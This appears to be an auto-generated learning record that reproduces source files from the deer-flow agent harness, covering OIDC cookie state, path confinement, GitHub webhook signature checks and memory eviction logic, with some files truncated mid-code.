# Forensic Learning Record (Deep Inspection): bytedance/deer-flow

> **Canonical Artifact**: `07_PROJECT_LEARNING/bytedance-deer-flow-learnings.md`  
> **Source Platform**: GitHub ([https://github.com/bytedance/deer-flow](https://github.com/bytedance/deer-flow))  
> **Harvest Method**: Full-Spectrum Deep Extraction (Patches, Diffs, Source Code, Post-Mortems)  
> **Harvest Timestamp**: 2026-10-05T18:56:20.597Z  
> **Compliance State**: Free Tier Guaranteed | Strict Rate-Limit Backoff Honored  

---

## 1. Context & Architectural Overview
- **Repository / Resource**: `bytedance/deer-flow`
- **Description**: An open-source long-horizon SuperAgent harness that researches, codes, and creates. With the help of sandboxes, memories, tools, skill, subagents and message gateway, it handles different levels of tasks that could take minutes to hours.
- **Primary Language / Ecosystem**: Python
- **Discovered Manifests / Configurations**: README.md
- **Stars / Engagement**: 83409 stars

---

## 2. Multi-Dimensional 8-Axis Investigation & Real Code Patches

### D1: Architecture & Structural Boundaries
- Entry configurations inspected via direct stream: README.md.
- Evaluated system abstractions and modular contracts.

### Core Architecture Module: `backend/app/gateway/auth/oidc_state.py`
```
"""OIDC state management via signed HttpOnly cookies.

Stores OIDC state, nonce, and PKCE verifier in a short-lived signed cookie
instead of server-side storage. This keeps the implementation stateless and
compatible with multi-worker deployments without Redis.
"""

from __future__ import annotations

import secrets
import time

import jwt
from fastapi import Request, Response
from pydantic import BaseModel, Field

from app.gateway.auth.config import get_auth_config
from app.gateway.csrf_middleware import is_secure_request

OIDC_STATE_COOKIE_PREFIX = "df_oidc_state_"
OIDC_STATE_MAX_AGE = 300  # 5 minutes
OIDC_STATE_BYTES = 32
OIDC_NONCE_BYTES = 16
OIDC_CODE_VERIFIER_BYTES = 32


class OIDCStatePayload(BaseModel):
    """Payload stored inside the signed OIDC state cookie."""

    provider: str = Field(description="OIDC provider ID (must match the state cookie)")  # noqa: E501
    state: str = Field(description="Cryptographically random state value — compared in constant time with the query param")  # noqa: E501
    nonce: str | None = Field(default=None, description="OIDC nonce, verified against the ID token nonce claim")
    code_verifier: str | None = Field(default=None, description="PKCE code verifier, sent during token exchange")
    next_path: str = Field(default="/workspace", description="Redirect target after successful auth")
    remember_me: bool = Field(default=True, description="Whether the resulting DeerFlow session should be persistent")
    issued_at: float = Field(default_factory=time.time, description="Unix timestamp of cookie creation")


def _sign_state_payload(payload: OIDCStatePayload) -> str:
    """Sign the state payload with the JWT secret to prevent tampering."""
    secret = get_auth_config().jwt_secret
    return jwt.encode(payload.model_dump(), secret, algorithm="HS256")


def _verify_state_signed(signed: str, max_age: int = OIDC_STATE_MAX_AGE) -> OIDCStatePayload | None:
    """Verify a signed state payload and return it, or None if invalid/expired."""
    secret = get_auth_config().jwt_secret
    try:
        decoded = jwt.decode(signed, secret, algorithms=["HS256"])
        payload = OIDCStatePayload(**decoded)
        if time.time() - payload.issued_at > max_age:
            return None
        return payload
    except jwt.PyJWTError:
        return None


def generate_oidc_state() -> str:
    """Generate a cryptographically random state string."""
    return secrets.token_urlsafe(OIDC_STATE_BYTES)


def generate_nonce() -> str:
    """Generate a cryptographically random nonce for ID token validation."""
    return secrets.token_urlsafe(OIDC_NONCE_BYTES)


def generate_code_verifier() -> str:
    """Generate a PKCE code verifier (plain random string)."""
    return secrets.token_urlsafe(OIDC_CODE_VERIFIER_BYTES)


def compute_code_challenge(verifier: str) -> str:
    """Compute the S256 PKCE code challenge from a verifier."""
    import hashlib

    return _base64url_encode(hashlib.sha256(verifier.encode("ascii")).digest())


def _base64url_encode(data: bytes) -> str:
    """Base64url-encode without padding, as required by RFC 7636 and OIDC."""
    import base64

    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _cookie_name(provider: str) -> str:
    return f"{OIDC_STATE_COOKIE_PREFIX}{provider}"


def set_state_cookie(response: Response, request: Request, payload: OIDCStatePayload) -> None:
    """Set the signed OIDC state cookie on the response."""
    signed = _sign_state_payload(payload)
    is_https = is_secure_request(request)
    response.set_cookie(
        key=_cookie_name(payload.provider),
        value=signed,
        httponly=True,
        secure=is_https,
        samesite="lax",
        max_age=OIDC_STATE_MAX_AGE,
        path=f"/api/v1/auth/callback/{payload.provider}",
    )


def get_state_cookie(request: Request, provider: str) -> OIDCStatePayload | None:
    """Read and verify the signed OIDC state cookie for the given provider."""
    signed = request.cookies.get(_cookie_name(provider))
    if not signed:
        return None
    return _verify_state_signed(signed)


def delete_state_cookie(response: Response, request: Request, provider: str) -> None:
    """Delete the OIDC state cookie."""
    is_https = is_secure_request(request)
    response.delete_cookie(
        key=_cookie_name(provider),
        secure=is_https,
        samesite="lax",
        path=f"/api/v1/auth/callback/{provider}",
    )

```

### Core Architecture Module: `backend/app/gateway/auth/session_cookie_state.py`
```
"""Request-state keys shared by session and CSRF cookie handling."""

SESSION_COOKIE_ISSUED_STATE_ATTR = "deerflow_session_cookie_issued"
SESSION_COOKIE_MAX_AGE_STATE_ATTR = "deerflow_session_cookie_max_age"
SESSION_COOKIE_SECURE_STATE_ATTR = "deerflow_session_cookie_secure"
SKIP_AUTH_CSRF_COOKIE_STATE_ATTR = "deerflow_skip_auth_csrf_cookie"

```

### Core Architecture Module: `backend/app/gateway/path_utils.py`
```
"""Shared path resolution for thread virtual paths (e.g. mnt/user-data/outputs/...)."""

import posixpath
from pathlib import Path

from fastapi import HTTPException

from deerflow.config.paths import VIRTUAL_PATH_PREFIX, get_paths
from deerflow.runtime.user_context import get_effective_user_id

OUTPUTS_VIRTUAL_ROOT = f"{VIRTUAL_PATH_PREFIX}/outputs"
_OUTPUTS_PREFIX = OUTPUTS_VIRTUAL_ROOT.lstrip("/") + "/"
_OUTPUTS_ONLY_DETAIL = f"Only files under {OUTPUTS_VIRTUAL_ROOT} are allowed"


def resolve_thread_virtual_path(thread_id: str, virtual_path: str, user_id: str | None = None) -> Path:
    """Resolve a virtual path to the actual filesystem path under thread user-data.

    Args:
        thread_id: The thread ID.
        virtual_path: The virtual path as seen inside the sandbox
                      (e.g., /mnt/user-data/outputs/file.txt).
        user_id: The user whose storage to resolve under. Defaults to the
                 effective user when not given; callers acting on behalf of a
                 specific owner (e.g. trusted internal callers) pass it explicitly.

    Returns:
        The resolved filesystem path.

    Raises:
        HTTPException: If the path is invalid or outside allowed directories.
    """
    try:
        return get_paths().resolve_virtual_path(thread_id, virtual_path, user_id=user_id or get_effective_user_id())
    except ValueError as e:
        status = 403 if "traversal" in str(e) else 400
        raise HTTPException(status_code=status, detail=str(e))


def normalize_outputs_virtual_path(virtual_path: str) -> str:
    """Return *virtual_path* as a canonical ``/mnt/user-data/outputs/...`` path.

    ``.``/``..`` segments and duplicate slashes are collapsed *before* the
    prefix check, so ``outputs/../uploads/x`` (or its percent-encoded form,
    which nginx forwards untouched and Starlette decodes) is rejected as a
    non-outputs path instead of slipping past a raw string-prefix test. The
    outputs directory itself is not a file and is rejected too.

    Raises:
        HTTPException: 400 when the path is not strictly inside outputs.
    """
    stripped = posixpath.normpath(virtual_path.lstrip("/")).lstrip("/")
    if not stripped.startswith(_OUTPUTS_PREFIX):
        raise HTTPException(status_code=400, detail=_OUTPUTS_ONLY_DETAIL)
    return f"/{stripped}"


def resolve_outputs_confined_path(thread_id: str, virtual_path: str, user_id: str | None = None) -> Path:
    """Resolve *virtual_path* and guarantee it lives inside the thread's outputs dir.

    ``resolve_thread_virtual_path`` only confines to ``user-data/``. Callers
    that must never touch uploads, workspace, or tool results (the artifact
    editor, IM-channel attachment delivery) go through this helper so the
    outputs rule lives in one place: the path is normalized lexically first,
    then the resolved host path is checked against the resolved outputs root,
    which also catches a symlink planted inside ``outputs/``.

    Existence is not checked; callers decide how a missing file surfaces.

    Raises:
        HTTPException: 400 when the path is not strictly inside outputs; 403
            when the underlying resolver detects traversal above ``user-data/``.
    """
    normalized = normalize_outputs_virtual_path(virtual_path)
    resolved_user_id = user_id or get_effective_user_id()
    actual_path = resolve_thread_virtual_path(thread_id, normalized, user_id=resolved_user_id)
    outputs_root = get_paths().sandbox_outputs_dir(thread_id, user_id=resolved_user_id).resolve()
    if actual_path == outputs_root or not actual_path.is_relative_to(outputs_root):
        raise HTTPException(status_code=400, detail=_OUTPUTS_ONLY_DETAIL)
    return actual_path

```

### Core Architecture Module: `backend/app/gateway/routers/github_webhooks.py`
```
"""Gateway router for inbound GitHub webhook deliveries.

Receives GitHub App / repository webhook events at ``POST /api/webhooks/github``.
This route is intentionally exempt from both the auth and CSRF middleware
(see ``auth_middleware._PUBLIC_PATH_PREFIXES`` and
``csrf_middleware.should_check_csrf``) because GitHub neither sends a
session cookie nor an ``X-CSRF-Token`` header.

Authenticity is enforced via the HMAC-SHA256 signature in the
``X-Hub-Signature-256`` request header, compared in constant time against
the shared secret in the ``GITHUB_WEBHOOK_SECRET`` environment variable.

**The route is fail-closed by default.** If ``GITHUB_WEBHOOK_SECRET`` is
unset, the route is not mounted at all (`/api/webhooks/github` responds
404) so a misconfigured deployment cannot accept forged deliveries. Set
``DEER_FLOW_ALLOW_UNVERIFIED_GITHUB_WEBHOOKS=1`` to mount the route
anyway for local development or loopback testing — every delivery is
then accepted unverified with a WARNING log line.

After verification the payload is fanned out by :func:`fanout_event` into
:class:`InboundMessage` instances on the channel bus, one per matching
custom agent binding. The :class:`GitHubChannel` (registered alongside
Feishu/Slack/etc.) takes care of posting the agent's reply back to GitHub.
"""

from __future__ import annotations

import hashlib
import hmac
import json
import logging
import os
from typing import Any

from fastapi import APIRouter, Header, HTTPException, Request

from app.gateway.github.dispatcher import fanout_event
from app.gateway.utils import constant_time_equals

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/webhooks", tags=["webhooks"])

_SECRET_ENV_VAR = "GITHUB_WEBHOOK_SECRET"
_ALLOW_UNVERIFIED_ENV_VAR = "DEER_FLOW_ALLOW_UNVERIFIED_GITHUB_WEBHOOKS"

# Events we explicitly recognise. Anything else still returns 200 (so
# GitHub does not retry) but is logged as "unhandled" for visibility.
_KNOWN_EVENTS: frozenset[str] = frozenset(
    {
        "ping",
        "issues",
        "issue_comment",
        "pull_request",
        "pull_request_review",
        "pull_request_review_comment",
    }
)


def _get_webhook_secret() -> str | None:
    """Return the configured webhook secret, or None if unset.

    Read at request time so operators can rotate the secret without a
    full process restart. Treats empty strings as "unset" so a stray
    ``GITHUB_WEBHOOK_SECRET=`` in ``.env`` does not silently disable
    signature verification.
    """
    value = os.environ.get(_SECRET_ENV_VAR)
    if value is None:
        return None
    stripped = value.strip()
    return stripped or None


def _unverified_webhooks_allowed() -> bool:
    """Return True iff the explicit dev opt-in for unverified deliveries is set.

    Truthy values: ``1``, ``true``, ``yes``, ``on`` (case-insensitive).
    Anything else (including unset) is False.
    """
    raw = os.environ.get(_ALLOW_UNVERIFIED_ENV_VAR, "").strip().lower()
    return raw in {"1", "true", "yes", "on"}


def is_route_enabled() -> bool:
    """Return True iff the GitHub webhook route should be mounted.

    Mounted when either:
        * ``GITHUB_WEBHOOK_SECRET`` is set (production / staging path), or
        * ``DEER_FLOW_ALLOW_UNVERIFIED_GITHUB_WEBHOOKS=1`` is set
          (explicit dev/loopback opt-in for testing without a real secret).

    When neither is set the route is intentionally absent — a fresh
    deployment with no secret in env cannot serve forged deliveries
    even by accident. Called by :mod:`app.gateway.app` at router
    inclusion time.
    """
    return _get_webhook_secret() is not None or _unverified_webhooks_allowed()


def _verify_signature(secret: str, body: bytes, signature_header: str | None) -> bool:
    """Verify the GitHub ``X-Hub-Signature-256`` HMAC.

    Expected header format: ``sha256=<hex>``. Returns False if the header
    is missing, malformed, or fails constant-time comparison.
    """
    if not signature_header:
        return False
    if not signature_header.startswith("sha256="):
        return False
    provided = signature_header.removeprefix("sha256=").strip()
    expected = hmac.new(secret.encode("utf-8"), body, hashlib.sha256).hexdigest()
    return constant_time_equals(provided, expected)


def _summarise_event(event: str, payload: dict[str, Any]) -> str:
    """Build a short, human-readable summary for the log line.

    Pulls the most useful identifiers per event type. Falls back to the
    raw action if anything unexpected shows up so we never crash here.
    """
    try:
        action = payload.get("action")
        repo = (payload.get("repository") or {}).get("full_name")

        if event == "ping":
            zen = payload.get("zen")
            hook_id = (payload.get("hook") or {}).get("id")
            return f"ping zen={zen!r} hook_id={hook_id} repo={repo}"

        if event == "pull_request":
            pr = payload.get("pull_request") or {}
            number = pr.get("number") or payload.get("number")
            title = pr.get("title")
            url = pr.get("html_url")
            return f"pull_request action={action} repo={repo} #{number} title={title!r} url={url}"

        if event == "pull_request_review":
            pr = payload.get("pull_request") or {}
            number = pr.get("number")
            review = payload.get("review") or {}
            state = review.get("state")  # approved | changes_requested | commented
            author = (review.get("user") or {}).get("login")
            return f"pull_request_review action={action} repo={repo} #{number} state={state} author={author}"

        if event == "issues":
            issue = payload.get("issue") or {}
            number = issue.get("number")
            title = issue.get("title")
            url = issue.get("html_url")
            return f"issues action={action} repo={repo} #{number} title={title!r} url={url}"

        if event == "issue_comment":
            issue = payload.get("issue") or {}
            number = issue.get("number")
            is_pr = "pull_request" in issue
            author = (payload.get("comment") or {}).get("user", {}).get("login")
            return f"issue_comment action={action} repo={repo} #{number} is_pr={is_pr} author={author}"

        if event == "pull_request_review_comment":
            pr = payload.get("pull_request") or {}
            number = pr.get("number")
            author = (payload.get("comment") or {}).get("user", {}).get("login")
            path = (payload.get("comment") or {}).get("path")
            return f"pull_request_review_comment action={action} repo={repo} #{number} path={path} author={author}"

        return f"{event} action={action} repo={repo}"
    except Exception as exc:  # pragma: no cover - defensive
        return f"{event} (summary failed: {exc!r})"


@router.post("/github")
async def receive_github_webhook(
    request: Request,
    x_github_event: str | None = Header(default=None, alias="X-GitHub-Event"),
    x_github_delivery: str | None = Header(default=None, alias="X-GitHub-Delivery"),
    x_hub_signature_256: str | None = Header(default=None, alias="X-Hub-Signature-256"),
) -> dict[str, Any]:
    """Receive a GitHub webhook delivery.

    - Verifies the HMAC-SHA256 signature against ``GITHUB_WEBHOOK_SECRET``.
    - Logs the event + delivery id + a one-line payload summary.
    - Returns ``{"ok": True, ...}`` on successful (or no-op) dispatch so
      GitHub marks the delivery successful and does not retry.

    **Transient fan-out failures return 503**, not 200. GitHub does NOT
    automatically retry a failed delivery of any kind — 5xx, timeout, or
    connection error are all simply recorded as failed; see
    https://docs.github.com/en/webhooks/using-webhooks/handling-failed-webhook-deliveries.
    Swallowing a transient registry filesystem error or bus publish
    failure into a 200 would mark the delivery successful, so it never
    surfaces as failed in GitHub's Recent Deliveries / Deliveries API and
    a scheduled recovery script filtering on non-OK status (the pattern
    GitHub's own docs recommend) will never flag it for redelivery. That
    is a discoverability problem, not literal unrecoverability — GitHub's
    manual "Redeliver" button and its REST/App redelivery endpoints place
    no failed-status precondition on the delivery id (see
    https://docs.github.com/en/webhooks/testing-and-troubleshooting-webhooks/redelivering-webhooks),
    so an operator who independently identifies this exact delivery can
    still redeliver it by hand within GitHub's ~3-day redelivery window —
    they just get no automated signal telling them to. Returning 503
    keeps the delivery correctly recorded as failed instead, so that same
    manual click, REST call, or recovery script actually finds it rather
    than merely being capable of redelivering it if asked, well inside
    the window the underlying outage usually clears in. The
    `is_route_enabled()` startup check still handles *configuration*
    errors fail-closed (route absent → 404); 503 is reserved for runtime
    failures worth making discoverable and recoverable this way.
    Permanent / non-retryable conditions (unknown event, missing channel
    service) keep returning 200.

    The route is fail-closed: :func:`is_route_enabled` should have already
    prevented this handler from being mounted when no secret is configured.
    The runtime guard below is a defense-in-depth fallback in case
    ``GITHUB_WEBHOOK_SECRET`` was unset *after* startup (e.g. an operator
    rotating env vars without restarting) — without the secret and without
    the explicit unverified opt-in, return 503 rather than accept a
    forgeable delivery.
    """
    body = await request.body()

    secret = _get_webhook_secret()
    if secret is None:
        if not _unverified_webhooks_allowed():
            # Should be unreachable if startup-time is_route_enabled() was honored,
            # but 
```

### Core Architecture Module: `backend/app/gateway/utils.py`
```
"""Shared utility helpers for the Gateway layer."""

import hmac


def sanitize_log_param(value: str) -> str:
    """Strip control characters to prevent log injection."""
    return value.replace("\n", "").replace("\r", "").replace("\x00", "")


def constant_time_equals(a: str, b: str) -> bool:
    """Compare two secret strings in constant time, never raising on content.

    ``hmac.compare_digest`` raises ``TypeError`` for ``str`` operands holding
    non-ASCII characters, and headers, cookies and query values are client
    controlled, so a stray byte would turn a rejection into a 500. Comparing
    the UTF-8 encodings keeps the same result for ASCII input; ``surrogatepass``
    lets even a lone surrogate encode instead of raising.
    """
    return hmac.compare_digest(a.encode("utf-8", "surrogatepass"), b.encode("utf-8", "surrogatepass"))

```

### Core Architecture Module: `backend/packages/extension-api/deerflow_extension_api/state.py`
```
"""Per-scope typed storage handed to extensions."""

from __future__ import annotations

from collections.abc import Callable
from threading import RLock
from typing import Any


class ExtensionData:
    """Extension-private state attached to one host-owned scope.

    Keyed by type rather than by string so independent extensions cannot
    collide on a key. The host creates one instance per scope (app, task) and
    drops it when that scope ends, which is why extensions never need a
    stale-handle check: they are handed the store for the current scope on
    every callback instead of capturing one.
    """

    __slots__ = ("_scope_id", "_entries", "_lock")

    def __init__(self, scope_id: str) -> None:
        self._scope_id = scope_id
        self._entries: dict[type, Any] = {}
        self._lock = RLock()

    @property
    def scope_id(self) -> str:
        """Host identity of the scope this store is attached to."""
        return self._scope_id

    def get[T](self, typ: type[T]) -> T | None:
        with self._lock:
            return self._entries.get(typ)

    def get_or_init[T](self, typ: type[T], init: Callable[[], T]) -> T:
        """Return the stored value, creating it from ``init`` when absent.

        ``init`` runs while the store is locked. It may compose other state in
        this store, but heavyweight lazy work belongs inside the stored value
        itself.
        """
        with self._lock:
            existing = self._entries.get(typ)
            if existing is not None:
                return existing
            created = init()
            self._entries[typ] = created
            return created

    def set[T](self, value: T) -> None:
        with self._lock:
            self._entries[type(value)] = value

    def remove[T](self, typ: type[T]) -> T | None:
        with self._lock:
            return self._entries.pop(typ, None)

```

### Core Architecture Module: `backend/packages/harness/deerflow/agents/goal_state.py`
```
from __future__ import annotations

from typing import Any, Literal, NotRequired, TypedDict

GoalBlocker = Literal[
    "none",
    "missing_evidence",
    "needs_user_input",
    "run_failed",
    "external_wait",
    "goal_not_met_yet",
]


class GoalEvaluation(TypedDict):
    satisfied: bool
    blocker: GoalBlocker
    reason: str
    evidence_summary: NotRequired[str]
    relied_on_assumption: NotRequired[bool]


class GoalState(TypedDict):
    objective: str
    status: Literal["active"]
    created_at: str
    updated_at: str
    continuation_count: int
    max_continuations: int
    no_progress_count: int
    max_no_progress_continuations: int
    last_evaluation: NotRequired[dict[str, Any]]

```

### Core Architecture Module: `backend/packages/harness/deerflow/agents/memory/backends/deermem/deermem/core/__init__.py`
```
"""DeerMem functional core: storage / queue / updater / prompt / message_processing.

Internal modules import each other via
``deerflow.agents.memory.backends.deermem.deermem.core.<module>``.
"""

```

### Core Architecture Module: `backend/packages/harness/deerflow/agents/memory/backends/deermem/deermem/core/eviction.py`
```
"""Deterministic, explainable capacity policies for canonical memory facts."""

from __future__ import annotations

import math
from dataclasses import dataclass
from datetime import UTC, datetime
from typing import Any

EVICTION_POLICY_CONFIDENCE = "confidence"
EVICTION_POLICY_HYBRID_V1 = "hybrid-v1"


@dataclass(frozen=True)
class FactEvictionScore:
    """One fact's bounded policy score and its explainable components."""

    value: float
    components: dict[str, float]


@dataclass(frozen=True)
class EvictedFact:
    """Metadata-only record for a fact removed by the capacity limit."""

    fact_id: str
    category: str
    score: float
    components: dict[str, float]


@dataclass(frozen=True)
class FactEvictionDecision:
    """Complete result of applying a capacity policy to one snapshot."""

    kept: list[dict[str, Any]]
    evicted: list[EvictedFact]
    scores: dict[str, FactEvictionScore]
    policy: str
    reserved_correction_slots: int = 0


def _bounded_number(value: Any, *, default: float = 0.0) -> float:
    if value is None or isinstance(value, bool):
        return default
    try:
        number = float(value)
    except (TypeError, ValueError):
        return default
    if not math.isfinite(number):
        return default
    return max(0.0, min(number, 1.0))


def _parse_datetime(value: Any) -> datetime | None:
    if not isinstance(value, str) or not value.strip():
        return None
    try:
        parsed = datetime.fromisoformat(value.strip().replace("Z", "+00:00"))
    except ValueError:
        return None
    if parsed.tzinfo is None:
        parsed = parsed.replace(tzinfo=UTC)
    return parsed.astimezone(UTC)


def _decay(*, elapsed_days: float, half_life_days: float) -> float:
    if half_life_days <= 0:
        return 0.0
    return 2 ** (-max(0.0, elapsed_days) / half_life_days)


def _confirmation_freshness(
    fact: dict[str, Any],
    *,
    now: datetime,
    half_life_days: float,
) -> float:
    confirmed_at = _parse_datetime(fact.get("lastConfirmedAt"))
    if confirmed_at is not None:
        elapsed = (now - confirmed_at).total_seconds() / 86400
        return _decay(elapsed_days=elapsed, half_life_days=half_life_days)

    created_at = _parse_datetime(fact.get("createdAt"))
    if created_at is None:
        return 0.0
    elapsed = (now - created_at).total_seconds() / 86400
    # Creation is weaker evidence than an explicit user confirmation.
    return 0.5 * _decay(elapsed_days=elapsed, half_life_days=half_life_days)


def _normalized_access_heat(
    usage: dict[str, Any] | None,
    *,
    now: datetime,
    half_life_days: float,
) -> float:
    if not isinstance(usage, dict):
        return 0.0
    last_accessed_at = _parse_datetime(usage.get("lastAccessedAt"))
    raw_heat = usage.get("accessHeat")
    if last_accessed_at is None or raw_heat is None or isinstance(raw_heat, bool):
        return 0.0
    try:
        heat = float(raw_heat)
    except (TypeError, ValueError):
        return 0.0
    if not math.isfinite(heat) or heat <= 0:
        return 0.0
    elapsed = (now - last_accessed_at).total_seconds() / 86400
    decayed_heat = heat * _decay(elapsed_days=elapsed, half_life_days=half_life_days)
    return min(1.0, math.log1p(decayed_heat) / math.log(9))


def _score_fact(
    fact: dict[str, Any],
    *,
    policy: str,
    usage: dict[str, Any] | None,
    now: datetime,
    confidence_weight: float,
    confirmation_weight: float,
    access_weight: float,
    confirmation_half_life_days: float,
    access_half_life_days: float,
) -> FactEvictionScore:
    confidence = _bounded_number(fact.get("confidence"), default=0.5)
    if policy == EVICTION_POLICY_CONFIDENCE:
        return FactEvictionScore(
            value=confidence,
            components={"confidence": confidence},
        )
    if policy != EVICTION_POLICY_HYBRID_V1:
        raise ValueError(f"Unknown fact eviction policy: {policy!r}")

    confirmation = _confirmation_freshness(
        fact,
        now=now,
        half_life_days=confirmation_half_life_days,
    )
    access = _normalized_access_heat(
        usage,
        now=now,
        half_life_days=access_half_life_days,
    )
    value = confidence_weight * confidence + confirmation_weight * confirmation + access_weight * access
    return FactEvictionScore(
        value=value,
        components={
            "confidence": confidence,
            "confirmationFreshness": confirmation,
            "accessHeat": access,
        },
    )


def select_facts_for_capacity(
    facts: list[dict[str, Any]],
    *,
    max_facts: int,
    policy: str,
    usage: dict[str, dict[str, Any]] | None = None,
    now: datetime | None = None,
    confidence_weight: float = 0.65,
    confirmation_weight: float = 0.25,
    access_weight: float = 0.10,
    confirmation_half_life_days: float = 90,
    access_half_life_days: float = 30,
    correction_reserved_fraction: float = 0.10,
    correction_reserved_max: int = 10,
) -> FactEvictionDecision:
    """Select facts under the configured cap without mutating the snapshot.

    ``confidence`` exactly preserves the historical ranking. ``hybrid-v1``
    combines three bounded signals and reserves only the minimum number of
    correction slots; unused slots immediately return to ordinary competition.
    """
    evaluated_at = (now or datetime.now(UTC)).astimezone(UTC)
    usage = usage or {}
    indexed_facts = list(enumerate(facts))
    scores: dict[str, FactEvictionScore] = {}
    for index, fact in indexed_facts:
        fact_id = str(fact.get("id") or f"__missing_{index}")
        scores[fact_id] = _score_fact(
            fact,
            policy=policy,
            usage=usage.get(fact_id),
            now=evaluated_at,
            confidence_weight=confidence_weight,
            confirmation_weight=confirmation_weight,
            access_weight=access_weight,
            confirmation_half_life_days=confirmation_half_life_days,
            access_half_life_days=access_half_life_days,
        )

    if len(indexed_facts) <= max_facts:
        return FactEvictionDecision(
            kept=list(facts),
            evicted=[],
            scores=scores,
            policy=policy,
        )

    ranked = sorted(
        indexed_facts,
        key=lambda item: (-scores[str(item[1].get("id") or f"__missing_{item[0]}")].value, item[0]),
    )
    reserved_count = 0
    selected_indexes: set[int] = set()
    if policy == EVICTION_POLICY_HYBRID_V1 and max_facts > 0:
        correction_slots = min(
            correction_reserved_max,
            math.ceil(max_facts * correction_reserved_fraction),
        )
        corrections = [item for item in ranked if str(item[1].get("category") or "").strip().lower() == "correction"]
        reserved_count = min(correction_slots, len(corrections), max_facts)
        selected_indexes.update(index for index, _fact in corrections[:reserved_count])

    for index, _fact in ranked:
        if len(selected_indexes) >= max(0, max_facts):
            break
        selected_indexes.add(index)

    kept = [fact for index, fact in ranked if index in selected_indexes]
    evicted: list[EvictedFact] = []
    for index, fact in reversed(ranked):
        if index in selected_indexes:
            continue
        fact_id = str(fact.get("id") or f"__missing_{index}")
        score = scores[fact_id]
        evicted.append(
            EvictedFact(
                fact_id=fact_id,
                category=str(fact.get("category") or "context"),
                score=score.value,
                components=dict(score.components),
            )
        )

    return FactEvictionDecision(
        kept=kept,
        evicted=evicted,
        scores=scores,
        policy=policy,
        reserved_correction_slots=reserved_count,
    )

```

### Core Architecture Module: `backend/packages/harness/deerflow/agents/memory/backends/deermem/deermem/core/llm.py`
```
"""DeerMem's own LLM construction (no deer-flow ``create_chat_model``).

``build_llm(model_config)`` builds a langchain ``ChatModel`` from DeerMem's
model sub-config (provider/model/api_key/base_url/temperature) via
``langchain.chat_models.init_chat_model``. DeerMem owns the resulting instance
(``self._llm``) and injects it into ``MemoryUpdater`` (dependency injection).

``DeerMem.__init__`` prefers a host-injected ``host_llm`` (the deer-flow
factory injects the app default model there when ``model`` is empty, mirroring
pre-abstraction ``model_name: null``); this ``build_llm`` is the fallback that
builds from the ``model`` sub-config. Returns ``None`` when ``model`` is empty
- standalone DeerMem then has no LLM (non-LLM ops still work; an update
raises), but via the factory ``host_llm`` covers the zero-config case. Any
provider langchain's ``init_chat_model`` supports works (OpenAI, Anthropic,
OpenAI-compatible gateways like DeepSeek, ...).
"""

from __future__ import annotations

import logging
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from ..config import DeerMemModelConfig

logger = logging.getLogger(__name__)


def build_llm(model_config: DeerMemModelConfig | None) -> Any:
    """Build a langchain ChatModel from DeerMem's model config (DI).

    Returns ``None`` if ``model_config`` is None, has no ``model`` set
    (zero-config: no LLM; non-LLM ops still work, an update will raise), OR if
    ``init_chat_model`` fails (misconfigured provider/api_key/base_url). The
    failure path degrades to ``None`` with a WARNING -- mirroring
    :func:`_host_default_llm` -- so a bad explicit ``model`` does not crash app
    startup: memory CRUD/read/search still work, extraction is disabled, and an
    update raises at runtime with the underlying error logged.
    """
    if model_config is None or not model_config.model:
        return None
    from langchain.chat_models import init_chat_model

    kwargs: dict[str, Any] = {}
    if model_config.api_key is not None:
        kwargs["api_key"] = model_config.api_key
    if model_config.base_url is not None:
        kwargs["base_url"] = model_config.base_url
    if model_config.temperature is not None:
        kwargs["temperature"] = model_config.temperature
    try:
        return init_chat_model(
            model=model_config.model,
            model_provider=model_config.provider or "openai",
            **kwargs,
        )
    except Exception as e:  # noqa: BLE001 - degrade like _host_default_llm (don't crash startup)
        logger.warning(
            "build_llm failed for model=%r (provider=%r): %s; memory extraction disabled (non-LLM ops still work; an update will raise).",
            model_config.model,
            model_config.provider or "openai",
            e,
        )
        return None

```

### Core Architecture Module: `backend/packages/harness/deerflow/agents/memory/backends/deermem/deermem/core/markdown_format.py`
```
"""Markdown-aware parsing for DeerMem user-memory summaries.

This module is intentionally dependency-free so it can be unit-tested and
imported without the rest of the DeerMem stack.

Design (read path only)
-----------------------
A Markdown summary carries its *lossless* state inside a fenced
```` ```memory-json ```` block. When loading, the fenced JSON block is the
only trusted Markdown representation: if it is present and parses to a JSON
object it is returned verbatim; anything else (no fence, malformed fence,
non-object JSON) yields ``None`` so the caller can decide policy (the
default is to quarantine the unreadable file rather than silently rebuild
over persistent state).

The JSON decoder locates the end of the value before the closing fence is
checked. Backticks inside remembered strings cannot truncate the value, and
later fenced notes cannot be accidentally consumed as part of the JSON.

A lossy structured parse of the human-readable sections is deliberately NOT
provided: it cannot reproduce the manifest schema (``user``/``history`` must
be objects, ``version``/``revision`` scalars) and previously surfaced as
``ValueError``/``AttributeError`` crashes on the very hand-edited files the
loader claimed to tolerate. Rendering Markdown is deferred to a future
write-path change.
"""

from __future__ import annotations

import json
import re
from typing import Any

_OPEN_FENCE_RE = re.compile(r"```memory-json[ \t]*\r?\n")
_CLOSE_FENCE_RE = re.compile(r"[ \t\r\n]*\r?\n[ \t]*```[ \t]*(?:\r?\n|$)")


def _parse_markdown_memory(raw: str) -> dict[str, Any] | None:
    """Parse a Markdown summary into a dict, or None when nothing usable.

    Only the fenced ```` ```memory-json ```` block is trusted. There is no
    structured fallback: without a valid fenced block the file cannot be
    mapped onto the manifest schema losslessly, so returning ``None`` (the
    caller quarantines and starts fresh) is the honest outcome.
    """
    opening = _OPEN_FENCE_RE.search(raw)
    if opening is None:
        return None
    payload = raw[opening.end() :].lstrip()
    try:
        value, end = json.JSONDecoder().raw_decode(payload)
    except json.JSONDecodeError:
        return None
    if _CLOSE_FENCE_RE.match(payload, end) is None:
        return None
    return value if isinstance(value, dict) else None

```

### Core Architecture Module: `backend/packages/harness/deerflow/agents/memory/backends/deermem/deermem/core/markdown_storage.py`
```
"""Opt-in Markdown-aware summary storage for DeerMem.

The default :class:`FileMemoryStorage` persists the user-memory *summary* as a
single JSON document. Reasoning/thinking models occasionally emit malformed
JSON, and a partially written summary historically raised
``MemoryStorageCorruption`` and took down the whole agent.

``MarkdownMemoryStorage`` keeps the same on-disk JSON as the default for full
backward compatibility, but its loader is *tolerant*:

* a corrupt or partially written summary no longer crashes the agent;
* a Markdown summary is accepted only through its fenced ```` ```memory-json ````
  block, which is parsed losslessly;
* when the on-disk file is unreadable (neither valid JSON nor a Markdown
  summary with a usable fenced block), it is *quarantined* as
